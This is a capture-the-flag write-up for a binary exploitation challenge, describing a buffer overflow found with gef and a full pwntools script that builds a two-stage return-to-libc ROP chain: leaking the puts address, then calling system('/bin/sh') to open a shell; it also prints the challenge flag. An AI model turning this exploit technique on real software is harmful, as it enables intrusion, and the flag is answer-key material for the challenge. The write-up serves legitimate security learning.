# Interview-opportunity

## Challenge Description: Good luck on your interview...

This challenge was very similar to HTB Cyber Santa's [naughty_list](../../HTB%20Cyber%20Santa%202021/Pwning/Naughty%20List/README.md), and so I used alot of the same methods to solve the challenge such as:
* Using **pwninit** to patch the binary to the provided libc file
* Finding the offset with **gef**
* Leaking the address of the *puts* function
* Using the *system* function from libc with the argument *'/bin/sh'* to pop a shell

The main difference this time was that I decided to use the *ROP* object from pwntools to simplify the code.

I first check the security permissions and see that **NX** is enabled, meaning that is likely a *return-to-libc* attack.
![checksec](https://user-images.githubusercontent.com/71312079/153183454-8fcd07ff-d0a2-4f54-9957-1cf9f459ebf0.png)

I then proceed to run the file and am greeted with the following prompt, to which I key in a string of 'a's and see the *segementation fault*

![segfault](https://user-images.githubusercontent.com/71312079/153183475-5dbbb084-3454-45a7-b450-bdd920646d84.png)

To determine the offset, I use **gef** and see that its value is *34* (Based on LE architecture from *checksec*)

![offset](https://user-images.githubusercontent.com/71312079/153183471-ec2e9a08-2f05-4cce-9c8b-d4639c735429.png)

Using *ROP* for payload generation saves me a step in finding the ROP objects, and pwntool's *flat* command allows me to flatten all the arguments into a single string to be sent as a payload. Using *rop.dump* also provides a sanity check in debugging errors as the payload can be seen in a nice format.

**Exploit script**
```python
from pwn import *

e = context.binary = ELF('./interview-opportunity_patched', checksec=False)
l = ELF('./libc.so.6', checksec=False)
r = process('./interview-opportunity_patched')
#r = remote('mc.ax', 31081)

offset = 34 
rop = ROP(e)
rop.puts(e.got['puts'])
rop.call(e.symbols['main'])
payload = flat({offset:rop.chain()})
log.info("Stage 1 ROP chain:\n" + rop.dump())

r.recvuntil(b'Gang?\n')
r.sendline(payload)
r.recvuntil(b'\n')
r.recvuntil(b'\n')

leaked_add = r.recvline().strip()
log.info("Leaked address:\n" + str(leaked_add))

puts_addr = u64(leaked_add.ljust(8, b'\x00'))
l.address = puts_addr - l.symbols['puts']

r.recvuntil(b'Gang?\n')

rop = ROP(l)
rop.system(next(l.search(b"/bin/sh")))
payload = flat({offset:rop.chain()})
log.info("Stage 2 ROP chain:\n" + rop.dump())
r.sendline(payload)
r.interactive()
```
Running the script above allowed me to obtain a shell and retrieve the flag.

![exploit](https://user-images.githubusercontent.com/71312079/153183468-d7fe44bf-4ace-4be2-aa75-e85a87b6bd47.png)


FLAG: `dice{0ur_f16h7_70_b347_p3rf3c7_blu3_5h4ll_c0n71nu3}`


